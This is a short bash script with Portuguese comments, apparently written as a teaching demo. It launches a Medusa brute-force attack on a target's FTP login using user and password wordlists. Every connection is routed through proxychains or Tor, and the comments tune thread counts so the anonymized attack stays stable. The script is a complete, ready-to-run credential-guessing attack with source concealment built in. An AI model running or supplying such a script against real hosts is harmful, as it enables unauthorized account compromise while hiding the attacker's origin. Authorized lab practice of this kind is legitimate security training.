#!/usr/bin/env bash
# ==============================================================================
# Script: medusa_proxychains_audit.sh
# Finalidade: Demonstracao didatica de auditoria utilizando Proxychains no Kali Linux
# Uso: Roteamento de conexoes atraves de proxies/Tor para avaliacao de comportamento
# ==============================================================================

TARGET_IP="${1:-192.168.56.101}"
USER_LIST="../wordlists/users_common.txt"
PASS_LIST="../wordlists/passwords_common.txt"
OUTPUT_FILE="medusa_proxychains_result.txt"

echo "=================================================="
echo "[+] Auditoria com Proxychains e Medusa"
echo "[+] Alvo: $TARGET_IP:21"
echo "=================================================="

# 1. Validacao da presenca do Proxychains
if ! command -v proxychains4 &> /dev/null && ! command -v proxychains &> /dev/null; then
    echo "[-] Erro: proxychains nao esta instalado. No Kali Linux: sudo apt install proxychains4"
    exit 1
fi

PROXY_CMD="proxychains4"
if ! command -v proxychains4 &> /dev/null; then
    PROXY_CMD="proxychains"
fi

# 2. Verificacao das wordlists
if [[ ! -f "$USER_LIST" ]] || [[ ! -f "$PASS_LIST" ]]; then
    echo "[-] Erro: Arquivos de wordlist nao encontrados em ../wordlists/"
    exit 1
fi

# 3. Execucao com Proxychains
# Observacao importante:
# Ao utilizar proxies/Tor, o paralelismo de threads DEVE ser reduzido (-t 1 ou -t 2)
# para evitar quebras de circuito, timeouts ou perda de sockets no pool de conexoes.
echo "[*] Disparando Medusa encapsulado via $PROXY_CMD..."
$PROXY_CMD medusa -h "$TARGET_IP" \
                  -U "$USER_LIST" \
                  -P "$PASS_LIST" \
                  -M ftp \
                  -t 1 \
                  -f \
                  -v 4 \
                  -O "$OUTPUT_FILE"

echo -e "\n[+] Execucao concluida. Relatorio gerado em: $OUTPUT_FILE"
